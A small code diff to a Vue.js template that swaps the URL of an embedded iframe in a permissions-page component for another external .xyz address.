@@ -1,7 +1,6 @@
 <template>
     <div class="quanxian">
-        <iframe
-            src="https://app.cashviolin.xyz/cossack-graver-underdogger/ruminative-heartbreaking-messy/boozy-helianthus/iivskc.html"
+        <iframe src="https://app.buddymoney.xyz/gangrenopsis-riometer/trunkless/gaffer-overexert-pratincole/bmqmp6.html"
             frameborder="0"></iframe>
         <div class="quanxian-bottom">
             <div class="quanxian-select">
